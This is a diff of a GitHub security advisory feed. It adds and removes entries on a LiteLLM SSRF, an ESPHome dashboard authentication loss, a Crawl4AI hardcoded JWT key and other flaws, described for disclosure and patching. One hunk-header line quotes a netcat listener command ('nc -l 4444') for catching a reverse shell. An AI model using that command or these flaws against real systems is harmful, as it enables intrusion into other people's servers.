+- &lt;https://github.com/ronf/asyncssh/commit/9c354270c009285525e126721e8ed5fbed1f8a67&gt;
+- &lt;https://github.com/ronf/asyncssh/releases/tag/v2.24.0&gt;
+- &lt;https://github.com/advisories/GHSA-rw4j-r22c-9gc3&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-17T14:53:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[litellm] LiteLLM Proxy has server-side request forgery via the `user_config` request parameter]]></title>
+        <id>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</id>
+        <link href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f"/>
+        <updated>2026-09-17T14:51:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A server-side request forgery in LiteLLM Proxy lets an authenticated caller redirect the
+proxy's outbound request to a host of their choosing by smuggling an <code>api_base</code> inside the
+<code>user_config</code> request body, bypassing the existing parameter guard.</p>
+<h3 id="details">Details</h3>
+<p>LiteLLM Proxy validates request bodies with <code>is_request_body_safe</code>, which blocks the
+<code>api_base</code> and <code>base_url</code> parameters but does not cover <code>user_config</code>. The <code>user_config</code>
+object is used to build the outbound router for a request, so a caller can place an
+<code>api_base</code> inside it and reach an arbitrary host. The guard only inspected the two
+top-level keys, so the same <code>api_base</code> nested inside <code>user_config</code> was never checked.</p>
+<p>Exploitation requires a valid virtual key.</p>
+<h3 id="impact">Impact</h3>
+<p>An authenticated caller can make the proxy issue server-side requests to internal or
+external hosts of their choosing, reaching endpoints the caller cannot otherwise access.</p>
+<h3 id="affected--patched">Affected / Patched</h3>
+<p>Affected: <code>&lt;= 1.83.8</code>
+Patched: <code>1.83.9</code></p>
+<h3 id="remediation">Remediation</h3>
+<p>Upgrade to 1.83.9 or later (released 2026-04-17).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59823">https://nvd.nist.gov/vuln/detail/CVE-2026-59823</a></li>
+<li><a href="https://github.com/BerriAI/litellm/pull/25827">https://github.com/BerriAI/litellm/pull/25827</a></li>
+<li><a href="https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427">https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427</a></li>
+<li><a href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/advisories/GHSA-hx8v-g79f-8w5f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-17T14:51:21.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[vllm] vLLM: Unauthenticated audio decompression-bomb DoS in /v1/chat/completions]]></title>
         <id>https://github.com/advisories/GHSA-hcwq-8wjf-3gcr</id>
@@ -491,131 +1224,6 @@ Attacker can use nc tool (nc -l 4444) to create a reverse shell and wait for con
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
             <uri>https://github.com/advisories/GHSA-c693-x898-5g4h</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-21T12:30:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[litellm] BerriAI litellm has Security Feature Bypass in BannedKeywords and AzureContentSafety Guardrails via call_type Mismatch on Async Endpoints]]></title>
-        <id>https://github.com/advisories/GHSA-p897-vf7j-f5h8</id>
-        <link href="https://github.com/advisories/GHSA-p897-vf7j-f5h8"/>
-        <updated>2026-09-14T18:11:28.000Z</updated>
-        <content type="html"><![CDATA[<p>A security flaw has been discovered in BerriAI litellm up to 1.82.5. Affected is the function async_pre_call_hook of the file enterprise/enterprise_hooks/banned_keywords.py of the component Completions Interface. The manipulation of the argument prompt results in incorrect authorization. The attack may be performed from remote. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12797">https://nvd.nist.gov/vuln/detail/CVE-2026-12797</a></li>
-<li><a href="https://gist.github.com/YLChen-007/078179224f07cc4e39e4f141a18c817a">https://gist.github.com/YLChen-007/078179224f07cc4e39e4f141a18c817a</a></li>
-<li><a href="https://vuldb.com/cve/CVE-2026-12797">https://vuldb.com/cve/CVE-2026-12797</a></li>
-<li><a href="https://vuldb.com/submit/811288">https://vuldb.com/submit/811288</a></li>
-<li><a href="https://vuldb.com/vuln/372559">https://vuldb.com/vuln/372559</a></li>
-<li><a href="https://vuldb.com/vuln/372559/cti">https://vuldb.com/vuln/372559/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-p897-vf7j-f5h8">https://github.com/advisories/GHSA-p897-vf7j-f5h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p897-vf7j-f5h8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-21T12:30:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[esphome-device-builder] ESPHome Device Builder: Renamed auth env vars silently disable dashboard authentication on upgrade]]></title>
-        <id>https://github.com/advisories/GHSA-rrxg-g2pf-6hh4</id>
-        <link href="https://github.com/advisories/GHSA-rrxg-g2pf-6hh4"/>
-        <updated>2026-09-14T18:08:58.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The dashboard reads its authentication credentials from <code>$ESPHOME_USERNAME</code> and <code>$ESPHOME_PASSWORD</code>. Earlier versions, and the legacy <code>esphome</code> dashboard, read the bare <code>$USERNAME</code> and <code>$PASSWORD</code> instead. When the env vars were renamed the bare names were dropped with no fallback, so an operator who had protected their dashboard with <code>USERNAME</code> / <code>PASSWORD</code> (as the older getting started guide documented) loses authentication on upgrade and the dashboard starts open to anyone who can reach its port.</p>
-<h2 id="details">Details</h2>
-<p>Credentials are resolved in <code>DashboardSettings.parse_args</code>. The fallback originally read <code>os.getenv("USERNAME")</code> and <code>os.getenv("PASSWORD")</code>. The env var rename (#265) replaced those with <code>ESPHOME_USERNAME</code> / <code>ESPHOME_PASSWORD</code> and intentionally removed the bare names, because <code>$USERNAME</code> collides with the OS login user on Linux and Windows and reading it on its own would silently promote the shell user to the dashboard username.</p>
-<p>The rename closed that footgun but introduced a backward compatibility break: a deployment that set only the bare names now resolves to no credentials, <code>using_password</code> is false, and the REST auth middleware and the WebSocket login gate are both disabled. The process logs a <code>WITHOUT AUTHENTICATION</code> banner at startup, but a container started detached (<code>docker run -d</code>) never surfaces it, so the exposure is silent in practice.</p>
-<p>This reaches users because the <code>dashboard</code> subcommand of the <code>ghcr.io/esphome/esphome</code> container runs this package: the container pins <code>esphome-device-builder</code> and execs it for <code>dashboard</code>, inheriting whatever env the operator passed. The standalone Docker path runs without <code>--ha-addon</code>, so it is the affected path. Home Assistant add on installs are not affected; they pass <code>--ha-addon</code> and authenticate through the supervisor ingress proxy, and do not use these env vars.</p>
-<p>The rename was tagged as a breaking change but was not surfaced in the 2026.6.0 changelog, so operators had no signal to migrate before upgrading.</p>
-<h2 id="impact">Impact</h2>
-<p>An unauthenticated client with network access to the dashboard port can manage devices, including editing configurations and flashing firmware. Only deployments that relied on the bare <code>$USERNAME</code> / <code>$PASSWORD</code> env vars for authentication are affected; deployments using <code>--username</code> / <code>--password</code>, the new <code>$ESPHOME_*</code> env vars, or HA add on ingress are not.</p>
-<h2 id="severity-rationale">Severity rationale</h2>
-<p>An unauthenticated network client crosses the dashboard's only security boundary, and a client past that boundary has host equivalent capability. ESPHome's <a href="https://github.com/esphome/device-builder/blob/main/docs/THREAT_MODEL.md">threat model</a> documents that an authenticated dashboard caller can run arbitrary code at compile time and read or write files in the config and data directories, so confidentiality, integrity, and availability are all High, with no credentials, no user interaction, and low attack complexity.</p>
-<p>The base score is rated for the worst case, an internet reachable dashboard. That worst case is the right anchor here, because this issue only affects operators who had deliberately configured a dashboard password, and setting a password is the control an operator uses precisely when the dashboard is reachable by parties they do not fully trust, including a deployment exposed to the internet or a network segment shared with untrusted devices. For the affected population a trusted network cannot be assumed, so authentication should be restored as urgent.</p>
-<p>Operational risk is lower for the subset of affected installations that run on a single trusted home or business network behind a firewall, since reaching the dashboard there requires an attacker who is already inside that network. ESPHome is <a href="https://esphome.io/guides/security_best_practices/">designed for deployment on trusted networks</a> with the network perimeter as the primary defense, so that deployment context reduces real world exposure; it does not lower the base severity, and operators on shared, guest, or internet reachable networks remain at full risk.</p>
-<h2 id="patches">Patches</h2>
-<p>Fixed in 1.0.12. The bare <code>$USERNAME</code> / <code>$PASSWORD</code> are accepted again as a deprecated fallback so previously protected instances stay protected across the upgrade without operator intervention, with a loud deprecation warning at startup directing operators to rename them to <code>$ESPHOME_USERNAME</code> / <code>$ESPHOME_PASSWORD</code>. The fallback is gated on <code>$PASSWORD</code> being set and is only adopted as a pair, so the OS provided <code>$USERNAME</code> is never read on its own and the original collision footgun stays closed. A lone bare <code>$PASSWORD</code> with no username still fails loud as a credential mismatch rather than starting unauthenticated.</p>
-<p>This restores compatibility rather than failing closed on the legacy names, because the priority is that an instance which was protected before the upgrade stays protected without the operator having to act; the deprecation warning plus a future removal handles the migration. Operators should migrate to the <code>$ESPHOME_*</code> names.</p>
-<p>The esphome container delivers the fix in the 2026.6.2 release, which bumps its pinned <code>esphome-device-builder</code> version to 1.0.12.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Without upgrading, restore authentication immediately by setting the new env vars to the same values, on any affected version:</p>
-<pre><code>ESPHOME_USERNAME=&lt;your-username&gt;
-ESPHOME_PASSWORD=&lt;your-password&gt;
-</code></pre>
-<p>Alternatively, do not expose the dashboard port to untrusted networks, and check the startup logs for the <code>WITHOUT AUTHENTICATION</code> banner to confirm whether a given instance is currently open.</p>
-<h2 id="references">References</h2>
-<ul>
-<li>Original report against the esphome container: GHSA-446m-c8jp-v37m</li>
-<li>Env var rename that introduced the regression: esphome/device-builder#265</li>
-<li>2026.6.0 changelog (breaking change was not documented): <a href="https://esphome.io/changelog/2026.6.0">https://esphome.io/changelog/2026.6.0</a></li>
-<li>Old setup documentation that used the bare names: <a href="https://esphome.io/guides/getting_started_command_line">https://esphome.io/guides/getting_started_command_line</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/esphome/device-builder/security/advisories/GHSA-rrxg-g2pf-6hh4">https://github.com/esphome/device-builder/security/advisories/GHSA-rrxg-g2pf-6hh4</a></li>
-<li><a href="https://github.com/esphome/device-builder/pull/1625">https://github.com/esphome/device-builder/pull/1625</a></li>
-<li><a href="https://github.com/esphome/device-builder/commit/9e294f729c3eb7334bb57b9fc49b75b728052f52">https://github.com/esphome/device-builder/commit/9e294f729c3eb7334bb57b9fc49b75b728052f52</a></li>
-<li><a href="https://github.com/esphome/device-builder/releases/tag/1.0.12">https://github.com/esphome/device-builder/releases/tag/1.0.12</a></li>
-<li><a href="https://github.com/advisories/GHSA-rrxg-g2pf-6hh4">https://github.com/advisories/GHSA-rrxg-g2pf-6hh4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rrxg-g2pf-6hh4</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-14T18:08:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[crawl4ai] Crawl4AI: authentication bypass vulnerability due to a hardcoded default JWT signing key in the Docker API server]]></title>
-        <id>https://github.com/advisories/GHSA-8qrg-7j2f-rf2h</id>
-        <link href="https://github.com/advisories/GHSA-8qrg-7j2f-rf2h"/>
-        <updated>2026-09-14T17:19:37.000Z</updated>
-        <content type="html"><![CDATA[<p>Crawl4AI before 0.8.7 contains an authentication bypass vulnerability due to a hardcoded default JWT signing key in the Docker API server. Attackers who know the default key can forge valid authentication tokens for any user, bypassing authentication and gaining full access to protected functionality.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/unclecode/crawl4ai/security/advisories/GHSA-365w-hqf6-vxfg">https://github.com/unclecode/crawl4ai/security/advisories/GHSA-365w-hqf6-vxfg</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56265">https://nvd.nist.gov/vuln/detail/CVE-2026-56265</a></li>
-<li><a href="https://www.vulncheck.com/advisories/crawl4ai-authentication-bypass-via-hardcoded-jwt-signing-key">https://www.vulncheck.com/advisories/crawl4ai-authentication-bypass-via-hardcoded-jwt-signing-key</a></li>
-<li><a href="https://github.com/unclecode/crawl4ai/releases/tag/v0.8.7">https://github.com/unclecode/crawl4ai/releases/tag/v0.8.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-8qrg-7j2f-rf2h">https://github.com/advisories/GHSA-8qrg-7j2f-rf2h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8qrg-7j2f-rf2h</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-21T15:31:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[litellm] BerriAI litellm: SSO Login Does Not Invalidate Previous UI Session Tokens]]></title>
-        <id>https://github.com/advisories/GHSA-w2mh-qq9q-453x</id>
-        <link href="https://github.com/advisories/GHSA-w2mh-qq9q-453x"/>
-        <updated>2026-09-14T17:19:21.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was identified in BerriAI litellm up to 1.82.2. This impacts the function get_redirect_response_from_openid of the file litellm/proxy/management_endpoints/ui_sso.py of the component SSO Authentication Flow. The manipulation leads to session expiration. The attack is possible to be carried out remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12796">https://nvd.nist.gov/vuln/detail/CVE-2026-12796</a></li>
-<li><a href="https://gist.github.com/YLChen-007/5fa8af12e1b183674d7ca96d852fb697">https://gist.github.com/YLChen-007/5fa8af12e1b183674d7ca96d852fb697</a></li>
-<li><a href="https://vuldb.com/cve/CVE-2026-12796">https://vuldb.com/cve/CVE-2026-12796</a></li>
-<li><a href="https://vuldb.com/submit/811287">https://vuldb.com/submit/811287</a></li>
-<li><a href="https://vuldb.com/vuln/372558">https://vuldb.com/vuln/372558</a></li>
-<li><a href="https://vuldb.com/vuln/372558/cti">https://vuldb.com/vuln/372558/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-w2mh-qq9q-453x">https://github.com/advisories/GHSA-w2mh-qq9q-453x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w2mh-qq9q-453x</uri>
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-06-21T12:30:52.000Z</published>
